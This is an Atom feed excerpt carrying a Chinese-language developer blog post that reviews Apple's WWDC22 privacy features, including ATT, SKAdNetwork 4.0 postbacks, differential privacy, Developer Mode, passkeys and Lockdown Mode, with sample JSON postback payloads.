&lt;p&gt;本文首发于 &lt;a href=&quot;https://juejin.cn/post/7118958291446661134&quot;&gt;WWDC22 - In App Purchase 更新总结 - 掘金&lt;/a&gt;，欢迎关注我们 &lt;a href=&quot;https://juejin.cn/user/1002387318511214&quot;&gt;@37手游iOS技术运营团队&lt;/a&gt; 。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;作者：iHTCboy&lt;/p&gt;
&lt;p&gt;WWDC21 是历年来 In App Purchase（IAP，内购内购买）最大变化的一年，分别推出了 StoreKit 2、App Store Server API、App Store Server Notifications V2 三大特性，去年我们也编写了 &lt;a href=&quot;https://juejin.cn/post/6974733392260644895&quot;&gt;《苹果iOS内购三步曲：App内退款、历史订单查询、绑定用户防掉单！— WWDC21》&lt;/a&gt; 文章，所以我们本文不会再深入提及去年的更新，大家如果不太熟悉，可以先温习一下。本文将对今年 WWDC22 带来的变化，从整体的视角一起回顾。&lt;/p&gt;</summary>
    
    
    
    <category term="technology" scheme="https://ihtcboy.com/categories/technology/"/>
    
    
    <category term="WWDC22" scheme="https://ihtcboy.com/tags/WWDC22/"/>
    
    <category term="In App Purchase" scheme="https://ihtcboy.com/tags/In-App-Purchase/"/>
    
  </entry>
  
  <entry>
    <title>WWDC22 - Apple 隐私技术探索</title>
    <link href="https://ihtcboy.com/2022/07/04/2022-07-04_WWDC22-Apple%E9%9A%90%E7%A7%81%E6%8A%80%E6%9C%AF%E6%8E%A2%E7%B4%A2/"/>
    <id>https://ihtcboy.com/2022/07/04/2022-07-04_WWDC22-Apple%E9%9A%90%E7%A7%81%E6%8A%80%E6%9C%AF%E6%8E%A2%E7%B4%A2/</id>
    <published>2022-07-04T02:01:10.000Z</published>
    <updated>2022-12-31T15:29:15.218Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>本文首发于 <a href="https://juejin.cn/post/7116331493659508744">WWDC22 - Apple 隐私技术探索 - 掘金</a>，欢迎关注我们 <a href="https://juejin.cn/user/1002387318511214">@37手游iOS技术运营团队</a> 。</p></blockquote><p>作者：iHTCboy</p><blockquote><p>一直以来，苹果对隐私保护都非常严格，虽然每年新 iPhone 发布前已经被暴光的，但从 2018 年 Facebook 隐私门开始，不管国内还是海外，行业巨头还是个人用户，大家对于隐私的关注都达到了新的高度。正如乔布斯说，开放和安全是截然相反的事情，但这件不容易的事，总需要有人做。从 WWDC20 开始，对用户隐私的保护，又达到了史前的疯狂程度，如推出 ATT（App Tracking Transparency），成为广告行业的敌人，更不要说平时对权限的严控，所以，本文带大家一起回顾苹果关于隐私的升级变化。</p></blockquote><span id="more"></span><p><img src="https://ihtcboy.com/images/WWDC22-Privacy-00.png" alt="WWDC22-Privacy-00"></p><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><blockquote><p>“We’re trying to do two diametrically opposed things at once: provide an advanced and open platform to developers while at the same time protect iPhone users from viruses, malware, privacy attacks, etc. This is no easy task.”</p><p>“我们试图同时做两件截然相反的事情：为开发人员提供一个先进和开放的平台，同时保护 iPhone 用户免受病毒、恶意软件、隐私攻击等。这不是一件容易的事。”</p><p>Steve Jobs, October 17, 2007</p></blockquote><p>一直以来，苹果对隐私保护都非常严格，虽然每年新 iPhone 发布前已经被暴光的，但从 2018 年 Facebook 隐私门开始，不管国内还是海外，行业巨头还是个人用户，大家对于隐私的关注都达到了新的高度。正如乔布斯说，开放和安全是截然相反的事情，但这件不容易的事，总需要有人做。从 WWDC20 开始，对用户隐私的保护，又达到了史前的疯狂程度，如推出 ATT（App Tracking Transparency），成为广告行业的敌人，更不要说平时对权限的严控，所以，本文带大家一起回顾苹果关于隐私的升级变化。</p><h3 id="相册-vs-权限控制"><a href="#相册-vs-权限控制" class="headerlink" title="相册 vs 权限控制"></a>相册 vs 权限控制</h3><p>以往，开发者只是想从用户相册选择一张图片，但是只能允许 App 访问整个相册的权限或者不允许访问，这一刀切的做法一直被吐槽。苹果在 <a href="https://developer.apple.com/videos/play/wwdc2020/10641">WWDC20</a> 针对相册权限新增了 <code>Limited Photo Library Access</code> 模式，用户可以选择 App 访问全部或部分的照片：</p><p><img src="https://ihtcboy.com/images/WWDC22-Privacy-01.png" alt="WWDC22-Privacy-01"></p><p>同时，也推出了 <a href="https://developer.apple.com/videos/play/wwdc2020/10652/">PHPickerController</a> 图片选择器：<br><img src="https://ihtcboy.com/images/WWDC22-Privacy-02.png" alt="WWDC22-Privacy-02"></p><p>相比已经淘汰的 UIImagePickerController 只能选择一张照片，PHPickerController 除了只支持 iOS 14+ 的缺点，它可以设置无上限张图片，另外也可以过滤选择的相册类型，图片、视频、livephoto 等。PHPickerController 是使用的系统独立进程，所以不需要申请相册权限，可以直接调用 API 访问，这也许是开发者应该考虑的一个更优雅的使用方式。</p><p>今年 <a href="https://developer.apple.com/videos/play/wwdc2022/10023">What’s new in the Photos picker - WWDC22</a> 苹果带来了更强大的相册过滤和已经支持 iOS/iPadOS/macOS/watchOS 全平台，也支持 SwiftUI 等。详细也可以查阅苹果文档 <a href="https://developer.apple.com/documentation/photokit/selecting_photos_and_videos_in_ios">Selecting Photos and Videos in iOS</a>。</p><h3 id="广告归因-vs-跟踪"><a href="#广告归因-vs-跟踪" class="headerlink" title="广告归因 vs 跟踪"></a>广告归因 vs 跟踪</h3><p>也许你也有过这样的经历：在某团购 app 购买过商品，然而你浏览其他 app 时，广告一直在向你推荐同样的商品。</p><p>因为你可能使用同一个邮箱账号登陆了不同的 app，他们之间通过共享这些信息，从而定位到你：</p><p><img src="https://ihtcboy.com/images/WWDC22-Privacy-03.png" alt="WWDC22-Privacy-03"></p><p>在浏览器中，广告商 cookie、根据浏览器配置以及安装的字体和插件、网络 IP 等特征，生成设备的 <code>指纹信息</code>来确定用户。</p><p>而在移动端 app 中，苹果提供 IDFA（Identifier For Advertisers，广告标识符） 来确实用户。为了保护用户隐私，早在 2012 年苹果公司就不再允许其生态的 App 获取用户的唯一标识符，但是商家在移动端打广告的时候又希望能监控到每一次广告投放的效果，因此，苹果想出了折中的办法，就是提供另外一套和硬件无关的标识符，用于给商家监测广告效果，同时用户可以在设置里改变这串字符，导致商家没有办法长期跟踪用户行为。</p><p>设置 IDFA 路径在 iOS 14 以下 <code>设置-&gt;隐私-&gt;广告-&gt;还原广告标识符</code>，而在 iOS 14 苹果在 WWDC20 推出 <code>ATT</code>（<code>App Tracking Transparency</code>, 应用追踪透明度）框架，旨在最终全面关闭 IDFA. 如果简单来说，苹果把 IDFA 是否允许 app 获取的权限交给了用户来选择：</p><p><img src="https://ihtcboy.com/images/WWDC22-Privacy-04.png" alt="WWDC22-Privacy-04"></p><p>当然，跟踪用户设备的目的是什么？最原始的目的是 <code>广告归因</code>。他们希望将购买归因于广告点击，以便商家知道将广告预算集中在哪里，此类归因用于衡量哪些广告有效。但随着移动端成为全球用户必备的随身设备，单单的广告归因已经不能满足他们的目的，收集购买习惯以及其他隐私信息，它们变得比你自己更了解自身的购买需求！</p><p>苹果推出的 <code>SKAdNetwork</code> 就是希望在广告端袜掉用户的标识，各 app 之间的用户标识，要不要共享给第三方使用，应该由用户自己决定：</p><p><img src="https://ihtcboy.com/images/WWDC22-Privacy-05.png" alt="WWDC22-Privacy-05"></p><p>SKAdNetwork 归因数据本身不具有任何用户标识符，所以无法跟踪用户。SKAdNetwork 是让广告平台在不获取 IDFA 的前提下，对用户的点击和安装行为提供的一套追踪解决方案。由于 Apple 的介入，将直接横跨设备与 App Store，并且不会把任何设备信息透露给广告主，并且更有利于防作弊。</p><p>当用户点击广告时，一个带有签名信息的 App Store 产品界面呈现出来，签名信息标记了此次广告活动。如果用户安装并且打开了 app，设备发送一个安装验证通知给广告网络。这个由 Apple 签名的通知包括广告活动 ID，但是不含用户或设备相关的数据。通知还可以包含一个转化数值和来源应用 ID，这个取决于苹果设定的一个隐私阈值。<br><img src="https://ihtcboy.com/images/WWDC22-Privacy-06.png" alt="WWDC22-Privacy-06"></p><p>SKAdNetwork 最大的问题就是提供了聚合的数据，但对于广告来说，这个过程已经不是简单的跟踪用户，而跟踪广告也是非常的重要，因为一个广告可能有多个不同的素材和不同的渠道测试等。首先 SKAdNetwork 回调通知可以获取的 <a href="https://developer.apple.com/documentation/storekit/skadnetwork/verifying_an_install_validation_postback">数据</a>：</p><p><strong>SKAdNetwork 2.0</strong></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;version&quot;</span> : <span class="string">&quot;2.0&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;ad-network-id&quot;</span> : <span class="string">&quot;com.example&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;campaign-id&quot;</span> : <span class="number">42</span>,</span><br><span class="line">  <span class="attr">&quot;transaction-id&quot;</span> : <span class="string">&quot;6aafb7a5-0170-41b5-bbe4-fe71dedf1e28&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;app-id&quot;</span> : <span class="number">525463029</span>,</span><br><span class="line">  <span class="attr">&quot;attribution-signature&quot;</span> : <span class="string">&quot;MDYCGQCsQ4y8d4BlYU9b8Qb9BPWPi+ixk\/OiRysCGQDZZ8fpJnuqs9my8iSQVbJO\/oU1AXUROYU=&quot;</span></span><br><span class="line">  <span class="string">&quot;redownload&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">&quot;source-app-id&quot;</span>: <span class="number">1234567891</span></span><br><span class="line">  <span class="string">&quot;conversion-value&quot;</span>: <span class="number">20</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>SKAdNetwork 3.0</strong></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123; </span><br><span class="line">  <span class="attr">&quot;version&quot;</span>: <span class="string">&quot;3.0&quot;</span>, </span><br><span class="line">  <span class="attr">&quot;ad-network-id&quot;</span>: <span class="string">&quot;example123.skadnetwork&quot;</span>, </span><br><span class="line">  <span class="attr">&quot;campaign-id&quot;</span>: <span class="number">42</span>, </span><br><span class="line">  <span class="attr">&quot;transaction-id&quot;</span>: <span class="string">&quot;6aafb7a5-0170-41b5-bbe4-fe71dedf1e28&quot;</span>, </span><br><span class="line">  <span class="attr">&quot;app-id&quot;</span>: <span class="number">525463029</span>, </span><br><span class="line">  <span class="attr">&quot;attribution-signature&quot;</span>: <span class="string">&quot;MEYCIQD5eq3AUlamORiGovqFiHWI4RZT/PrM3VEiXUrsC+M51wIhAPMANZA9c07raZJ64gVaXhB9+9yZj/X6DcNxONdccQij&quot;</span>, </span><br><span class="line">  <span class="attr">&quot;redownload&quot;</span>: <span class="literal">true</span>, </span><br><span class="line">  <span class="attr">&quot;source-app-id&quot;</span>: <span class="number">1234567891</span>, </span><br><span class="line">  <span class="attr">&quot;fidelity-type&quot;</span>: <span class="number">1</span>, </span><br><span class="line">  <span class="attr">&quot;conversion-value&quot;</span>: <span class="number">20</span>,</span><br><span class="line">  <span class="attr">&quot;did-win&quot;</span>: <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>字段说明：</p><ul><li>version：版本号</li><li>ad-network-id：  广告平台ID</li><li>transaction-id： 用于转换去重的确认</li><li>campaign-id： 记录广告 campaign 信息</li><li>app-id： 投放广告的 ID 信息</li><li>attribution-signature： Apple 对于归因的确认</li><li>redownload： 是否重复下载</li><li>source-app-id： 从哪个app 上看到广告且安装的</li><li>conversion-value： 转换价值</li><li>fidelity-type： 2.2 及更高版本提供。值为 0 表示页面展示类型的广告；值为 1 表示 StoreKit 渲染的广告。</li><li>did-win： 3.0 及更高版本提供。如果广告网络赢得归因，则为 true，如果回发代表没有赢得归因的合格广告效果，则为 false。</li></ul><p>注：</p><ul><li>回调的 conversion-value: 无符号的 6 bit 整数（也就是只能为 0-63 的数字）。由广告主应用和广告网络决定此值的含义。默认为0。所以，因为数字太小，无法绑定到用户信息。</li><li>在实践中，开发者可以仔细把握调用的时机，并且对conversion-value数值做良好的定义，就能达到衡量广告用户质量的目的。</li></ul><p>今年 WWDC22，苹果带来了 SKAdNetwork 4.0，为广告商提供有关其广告系列的更多信息，同时继续保护用户隐私。</p><p><strong>分层源标识符</strong> </p><p>这个字段以前称为 <code>campaign-id</code>（活动ID字段），允许广告商识别安装归因于哪个广告系列，以及额外的归因信息，并且以前只能有 0~99 的 campaign ID。广告商可以根据自己的目标配置这个四位数值，例如广告系列价值、广告投放或广告创意类型。<br><img src="https://ihtcboy.com/images/WWDC22-Privacy-07.png" alt="WWDC22-Privacy-07"><br>虽然苹果提供了 4 位数字配置，但是并不一定返回 4 位。苹果始终至少包含两位数字，根据广告系列所满足的安装次数和用户隐私级别，最多可以包含四位数字。例如，如果广告系列没有生成足够数量的安装，则回发的源标识符字段中只会显示两位数字。这为广告商提供了更大的广告系列灵活性，并在达到隐私阈值时提供了额外的归因洞察力，同时保护了跨应用程序的用户隐私。</p><p><strong>为什么苹果说足够数量的安装才会返回更多的位数？</strong>这里有一个概念 <code>differential privacy techniques</code>（差分隐私技术），利用这种技术，避免可以跟踪定位到用户层级的数据。下文会提到，这里暂时先略过，有兴趣可以翻到下文查看。</p><p><strong>多次转换通知</strong> </p><p>SKAdNetwork 最大的一个问题是，归因延迟至少 24 小时，严重影响了转换率的统计，投放的广告不能马上看到效果，这是广告投放最可怕的事，投了钱不能马上看到效果，是亏还是赚还要等。虽然今年苹果并没有提高实时回调（估计未来也不会），但提供了最多三次通知，每次都基于特定的转换窗口（分别为0-2天、3-7天和8-35天）。这使他们能够更好地了解从广告系列中安装应用程序的人随着时间的推移与广告应用程序的互动程度。<br><img src="https://ihtcboy.com/images/WWDC22-Privacy-08.png" alt="WWDC22-Privacy-08"></p><blockquote><p>注：每个转换窗口可以包含多个活动广告。SourceID、SourceAppID和粗粒度转换值是有条件的，只有在达到隐私阈值时才包含在第二次和第三次回调中。</p></blockquote><p>需要说明的是，使用 SKAdNetwork 不需要用户允许 App Tracking Transparency 广告跟踪，因为 SKAdNetwork 是聚合数据，从回调的数据中，广告商是不能反向定位用户信息，所以并不需要 ATT 的授权。</p><p>同理，因为没有用户层级的数据，LTV（Life-Time Value）的数据将会失效。这对广告主来说，是巨大对的影响。以往跟踪 LTV 数据然后进行媒体侧投放买量的行为，将会失效。所以广告主一直想跟踪用户，除了 ATT 外，设备指纹是目前剩下的方式，但根据 Apple Developer Program 许可协议，开发者不得为了唯一识别设备而从设备中获取数据。用户或设备数据的示例包括但不限于：用户的网页浏览器及其配置、用户的设备及其配置、用户的位置或用户的网络连接。引用SDK的应用程序，包括但不限于广告网络、归因服务和分析，如果发现参与这种做法，可能会被App Store拒绝。</p><h3 id="Safari-vs-PCM（私人点击测量）"><a href="#Safari-vs-PCM（私人点击测量）" class="headerlink" title="Safari vs PCM（私人点击测量）"></a>Safari vs PCM（私人点击测量）</h3><p>Safari 浏览器拥有多项先进功能，帮助保护你的隐私安全，防止你受到跨网站跟踪，并能最大限度减少传送给第三方的数据。对于苹果来说，没有浏览器广告业务，隐私保护自然做的更加好。</p><p>PCM（Private Click Measurement，私人点击测量）隐私保护广告点击归因，是苹果提出的一个 Web 网络标准技术，浏览器充当了搜索网站和商家网站的中间人。 中间人会限制网站之前发送的信息，过滤掉用户敏感信息，只发送归因的参数，比如 Campaign（广告组） 和 Convert （转化事件）。</p><p>详细技术可以阅读苹果官方文档：</p><ul><li><a href="https://webkit.org/blog/11529/introducing-private-click-measurement-pcm/">Introducing Private Click Measurement, PCM</a></li><li><a href="https://webkit.org/blog/8943/privacy-preserving-ad-click-attribution-for-the-web/">Privacy Preserving Ad Click Attribution For the Web | WebKit</a></li><li><a href="https://privacycg.github.io/private-click-measurement/">Private Click Measurement</a></li></ul><p>SKAdNetwork 4.0 支持<strong>网页版 SKAdNetwork</strong>，让广告商能归因那些会转至推广 App 的 App Store 产品页面的网页广告，除了移动网站外，苹果还支持 iOS 和 iPadOS app 的 <a href="https://developer.apple.com/documentation/safariservices/sfsafariviewcontroller">SFSafariViewController</a>。</p><h3 id="App-Store-vs-转化率"><a href="#App-Store-vs-转化率" class="headerlink" title="App Store vs 转化率"></a>App Store vs 转化率</h3><p>App Store 让开发者能在 175 个地区提供面向 iPhone、iPad、Mac、Apple TV 及 Apple Watch 的 App 和服务。如何触及更多用户，并不断发展您的业务，App Store 提供了巨大的商机，自定产品页、产品页优化、App 内活动、优惠订阅等等。</p><p><img src="https://ihtcboy.com/images/WWDC22-Privacy-09.png" alt="WWDC22-Privacy-09"></p><p><strong>衡量 App 表现</strong></p><p>有多少用户在 App Store 上搜索或浏览时发现了您的 App？哪些 App 和网站吸引了用户查看您的产品页？怎么衡量自己 App 的下载次数（包括首次下载次数、重新下载次数和总下载次数）以及您的 App Store 转化率？</p><p>苹果今年 WWDC22 提供 <a href="https://developer.apple.com/videos/play/wwdc2022/10044/">App 分析中的基准</a> 功能，基准通过将与获客率、使用和盈利情况相关的绩效指标置于具体情境中，在整个客户旅程期间提供有价值的见解，这样您就可以很容易地看到您与同行相比的表现，并做出相应决策以实现业务目标。</p><p>举例来说，查看 app 转化率，开发者可以了解自己 app 与同类 app 的表现情况：<br><img src="https://ihtcboy.com/images/WWDC22-Privacy-10.png" alt="WWDC22-Privacy-10"></p><p>App Store 通过独家提供的宝贵数据，来深入了解和发现您的 App 的表现效果。苹果提供转化率、1/7/28天留存率、崩溃率和平均付款率等。</p><p><img src="https://ihtcboy.com/images/WWDC22-Privacy-11.png" alt="WWDC22-Privacy-11"></p><p>开发者可能会有疑问，苹果这是公开开发者的数据吗？苹果表示对照组 app 使用 <code>differential privacy techniques</code>（差分隐私技术），以确保机密信息的安全性和私密性。那么什么是<strong>差分隐私技术</strong>？</p><p><img src="https://ihtcboy.com/images/WWDC22-Privacy-12.png" alt="WWDC22-Privacy-12"></p><p>举例来说，假设有一个问题用户可以回答 Yes 或  No，那么如果用户选择 <code>Yes</code>，那么这个选择上传到服务器时，会先随机生成 Yes 或者  No，那么有 50% 概率是 Yes 也就是用户的选择。如果是 No，在随机生成一次 Yes 或者 No，然后有 25% 概率是 <code>假数据</code>。因为数据有可能是假信息，所以可以避免通过用户的数据推导（定位）到指定的用户。所以差分隐私技术能够增强数据匿名和数据汇总的隐私保护程度。</p><p>这里读者可以有疑问，这样数据样本就不具有准确性了吗？所以，差分隐私技术的一个前提条件，是数据量必然很大，才能减少这些随机数据的影响。从上面的例子来说，至少 75% 是正确的选择，最高接近 100% 是正确选择。</p><p>关于差分隐私技术，可以参考苹果文档了解更多：</p><ul><li><a href="https://www.apple.com/privacy/docs/Differential_Privacy_Overview.pdf">Differential Privacy Overview - Apple</a></li><li><a href="https://machinelearning.apple.com/updates/ppml-workshop-2022">Apple Privacy-Preserving Machine Learning Workshop 2022 - Apple Machine Learning Research</a></li><li><a href="https://machinelearning.apple.com/research/learning-with-privacy-at-scale">Learning with Privacy at Scale - Apple Machine Learning Research</a></li><li><a href="https://www.youtube.com/watch?v=gI0wk1CXlsQ">Differential Privacy - Simply Explained - YouTube</a></li></ul><h3 id="App-vs-开发者模式"><a href="#App-vs-开发者模式" class="headerlink" title="App vs 开发者模式"></a>App vs 开发者模式</h3><p><img src="https://ihtcboy.com/images/WWDC22-Privacy-13.png" alt="WWDC22-Privacy-13"></p><p>iOS 16 和 watchOS 9 中引入的开发者模式，用于保护用户在设备上无意中安装有害软件的问题，并减少仅由开发者功能暴露的攻击载体。</p><p>对于开发者来说，此举可能比较麻烦，从体验来说打开开发者模式还算快。对于用户来说，影响是比较深远，像我们之前的文章提到 <a href="https://juejin.cn/post/7020201677072367623">iOS15 安全漏洞分析：价值10万美元的漏洞曝光</a>，0 day 漏洞还是 1 day 漏洞，对于不升级系统的用户，破坏性依然存在，但如果有了开发者模式，普通用户受影响的范围会降低很多。</p><p><img src="https://ihtcboy.com/images/WWDC22-Privacy-14.png" alt="WWDC22-Privacy-14"></p><p>对于使用签名分发包体的方式，未来估计不复存在，一方面教育用户启动开发者模式成本很高，另一方面苹果对于开启做了多重警告提示用户。另一种企业证书，目前苹果已经不在审批新的企业证书，所以未来只会越来越少，直到消失。至此，安全性的价值远大于开发者启动开发者模式带来的不便。</p><p>详细可以参考苹果文档：<a href="https://developer.apple.com/documentation/xcode/enabling-developer-mode-on-a-device">Enabling Developer Mode on a device</a>。</p><h3 id="隐私-vs-可见性"><a href="#隐私-vs-可见性" class="headerlink" title="隐私 vs 可见性"></a>隐私 vs 可见性</h3><p>除了隐私权限由用户来决定，苹果也将越来越多的隐私权限使用的可见性。例如 WWDC20 推出的 <code>隐私标签</code>、<code>App 隐私报告</code>：</p><p><img src="https://ihtcboy.com/images/WWDC22-Privacy-15.png" alt="WWDC22-Privacy-15"></p><p>App Store 里的产品介绍页面包含一个隐私处理说明版块，以简洁易读的标签摘要形式，呈现由开发者提供的隐私信息处理方式报告，确保用户能在充分知情的情况下进行选择。</p><p>开启“记录 App 活动”功能后，你所有 app 的行为都一目了然。“设置”中的这个版块让你可以查看过去 7 天内各 app 访问你的位置、照片、摄像头、麦克风以及通讯录的频率。它还会显示这些 app 访问其他域的频率。结合隐私标签所提供的信息，你可以更加全面地了解所用 app 如何处理你的隐私。</p><p>在 iOS 16，可以通过菜单栏点击查看当前有那些 app 在使用定位权限。摄像头、麦克风等也能点击查看是那个 app 在使用对应的权限了。<br><img src="https://ihtcboy.com/images/WWDC22-Privacy-16.png" alt="WWDC22-Privacy-16"></p><p><strong>粘贴板使用透明度</strong></p><p><img src="https://ihtcboy.com/images/WWDC22-Privacy-17.png" alt="WWDC22-Privacy-17"></p><p>在 iOS 15 中，当有 app 从粘贴板拷贝内容时，系统会发出通知，提醒用户留意此行为。而 iOS 16 开发者粘贴来自其他 app 的内容时，需要弹窗请求用户允许，且在未经允许前，无法访问粘贴板的内容。</p><p>有三种方法可以避免此提示出现在 app 中:</p><ul><li>使用编辑选项菜单</li><li>使用键盘快捷键</li><li>使用 <a href="https://developer.apple.com/documentation/uikit/uipastecontrol">UIPasteControl</a></li></ul><p><strong>UIDevice.name</strong><br><img src="https://ihtcboy.com/images/WWDC22-Privacy-18.png" alt="WWDC22-Privacy-18"></p><p>Entitlements 文件中包括 <code>com.apple.developer.device-information.user-assigned-device-name</code>，才能获取到真实的设备名。但目前从苹果文档 <a href="https://developer.apple.com/documentation/uikit/uidevice">UIDevice</a> 还没有看到相关的配置说明。</p><p><strong>macOS app 权限</strong></p><p>macOS Ventura 系统配置 UI 更新，并且对 App 权限进行更加精细的管理，包含 app 要调用或删除其它 app（与当前 app 包名不一样的 app），或者电脑启动时，自动启动的 app 或者服务等，都有严格的控制：<br><img src="https://ihtcboy.com/images/WWDC22-Privacy-19.png" alt="WWDC22-Privacy-19"></p><p>另外，苹果提供 <a href="https://developer.apple.com/documentation/servicemanagement/smappservice?changes=_5&language=objc">SMAppService API</a> 来控制这些服务能力。</p><p><strong>Gatekeeper（门禁）</strong></p><p>Gatekeeper（门禁）技术，旨在确保只有受信任的软件才能在 Mac 上运行。</p><p><img src="https://ihtcboy.com/images/WWDC22-Privacy-20.png" alt="WWDC22-Privacy-20"></p><p>Gatekeeper 检查新下载的应用程序的完整性，在 macOS Ventura 中，Gatekeeper 将检查所有经过公证的应用程序的完整性，而不仅仅是隔离的应用程序。有一些 app 往往不止是一个 app，而有多个不同的 app，如果需要更新这些 app，需要在 Info.plist 添加 <code>NSUpdateSecurityPolicy</code> 来指定那些 app 包更新权限。</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;NSUpdateSecurityPolicy&quot;</span> =&gt; &#123;</span><br><span class="line">      <span class="string">&quot;AllowProcesses&quot;</span> =&gt; &#123;</span><br><span class="line">        <span class="string">&quot;123ABC&quot;</span> =&gt; [</span><br><span class="line">          <span class="number">0</span> =&gt; <span class="string">&quot;com.example.pal.about&quot;</span></span><br><span class="line">        ]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>注：截止本文发表，苹果还没有更新 <code>NSUpdateSecurityPolicy</code> 相关详细的文档。</p></blockquote><p><strong>设备连接</strong></p><p>大家会经常看到这样的授权，本地局域网或者蓝牙授权：<br><img src="https://ihtcboy.com/images/WWDC22-Privacy-21.png" alt="WWDC22-Privacy-21"></p><p>需要这些权限，是因为连接的管理设备选择需要了解所有设备，但这提供了对不必要信息的访问，并带来设备指纹风险。</p><p><img src="https://ihtcboy.com/images/WWDC22-Privacy-22.png" alt="WWDC22-Privacy-22"></p><p>iOS 16 可以通过 <code>DeviceDiscoveryExtension</code> Framework 来引导用户连接对应的设备。但截止目前还没有找到相关的文档说明。</p><h3 id="没有密码-and-没有验证码"><a href="#没有密码-and-没有验证码" class="headerlink" title="没有密码 and 没有验证码"></a>没有密码 and 没有验证码</h3><blockquote><p>Apple、谷歌与微软承诺拓展对 FIDO 标准的支持，以加速普及免密码登录<br><a href="https://www.apple.com.cn/newsroom/2022/05/apple-google-and-microsoft-commit-to-expanded-support-for-fido-standard/">来源</a></p></blockquote><p>隐私与安全，最安全的身份验证可以是根据用户的生物特征来验证，而利益于指纹识别、面部识别等技术成熟，Passkeys 就是基于这些基础而免于输入密码。而验证码是用于验证用户和机器人的区别，在我们生活中，验证码已经无处不在，而苹果基于自家的 iCloud、Apple ID 账号体系提供了 <code>Private Access Tokens</code>（PAT，私有访问凭据）来信任设备。</p><p><img src="https://ihtcboy.com/images/WWDC22-Privacy-23.png" alt="WWDC22-Privacy-23"></p><blockquote><p>详细技术细节，可以观看 <a href="https://developer.apple.com/videos/play/wwdc2022/10092">Meet passkeys - WWDC22</a>、<a href="https://developer.apple.com/videos/play/wwdc2022/10077/">Replace CAPTCHAs with Private Access Tokens - WWDC22</a>，或阅读 <a href="https://xiaozhuanlan.com/topic/8042173596">遇见 Passkey</a>、<a href="https://xiaozhuanlan.com/topic/6437105829">验证码的替代者—私有访问凭证</a> 文章。</p></blockquote><h3 id="Lockdown-Mode（锁定模式）"><a href="#Lockdown-Mode（锁定模式）" class="headerlink" title="Lockdown Mode（锁定模式）"></a>Lockdown Mode（锁定模式）</h3><ul><li><a href="https://www.apple.com.cn/newsroom/2022/07/apple-expands-commitment-to-protect-users-from-mercenary-spyware/">Apple 扩展安全承诺，保护用户免遭间谍软件侵害 - Apple (中国大陆)</a></li></ul><p>2022 年 7 月 6 日，苹果更新了 iOS 16 beta2 版本开始，增加了 <code>Lockdown Mode</code>（锁定模式）</p><p><img src="https://ihtcboy.com/images/WWDC22-Privacy-24.png" alt="WWDC22-Privacy-24"></p><p>Lockdown 旨在为极少数用户提供可选的极端保护。这些用户因其身份或工作性质，可能被极为先进的数字威胁锁定为攻击目标，如来自 <a href="https://www.apple.com.cn/newsroom/2021/11/apple-sues-nso-group-to-curb-the-abuse-of-state-sponsored-spyware/">NSO Group 等在国家授意下开发间谍软件的私人企业发起的攻击</a>。在 iOS 16、iPadOS 16 和 macOS Ventura 中开启 Lockdown 模式将进一步加强设备防护，严格限制部分功能，大幅减少受攻击面，以免给具高度针对性的间谍软件可乘之机。</p><p>Lockdown 模式发布时将包括下列保护功能：</p><ul><li>信息：除图片之外的绝大多数信息附件类型将被拦截。链接预览等部分功能将被禁用。</li><li>网络浏览：just-in-time (JIT) JavaScript 编译器等部分复杂网络技术将被禁用，除非用户在 Lockdown 模式中设置受信站点白名单。</li><li>Apple 服务：向用户发起的 FaceTime 通话等邀请与服务请求将被拦截，除非用户此前向对方发起过通话或请求。</li><li>iPhone 锁定时，与电脑或配件的有线连接也将被拦截。</li><li>Lockdown 模式开启后将无法安装配置文件，且设备无法加入移动设备管理（MDM）。</li></ul><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><blockquote><p>“我相信人都是聪明的，有些人也愿意分享更多数据。 这就要征询他们的同意，每一次都征询。就算他们厌倦了，也得让他们来告诉你不必再问了。而且你要确切地告诉他们，你会怎样使用他们的数据。”</p><p>Steve Jobs<br>2010 年，万物数字化大会 (All Things Digital Conference)</p></blockquote><p>正如乔布斯所说，隐私保护，最终让用户决定。但需要注意，在安全的环境下让用户全权决定，但不是代表一味地追求完全自主。苹果通过技术在 <code>先进和开放</code>、<code>隐私和安全</code> 之间，找到了关联。</p><p>区块链 Web 3.0 概念虽然火热，但其不可篡改也不可撤销也未必适合所有场景。2022 年 6 月 30 号，苹果强制要求具备账号体系的 App 必须提供 <a href="https://developer.apple.com/cn/news/?id=12m75xbj">帐户删除</a> 的功能，对于用户来说，删除数据重要吗。</p><p>ATT 对于广告行业，使用 SKAdNetwork，就像投放广告，没有最好的广告，也没有最好的唯一方式，在垄断与隐私方面，依然需要探索更多的可能性和平衡性。</p><blockquote><p>欢迎关注我们，了解更多 iOS 和 Apple 的动态~</p></blockquote><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="https://developer.apple.com/videos/play/wwdc2020/10652/">Meet the new Photos picker - WWDC20 - Videos - Apple Developer</a></li><li><a href="https://developer.apple.com/videos/play/wwdc2020/10641">Handle the Limited Photos Library in your app - 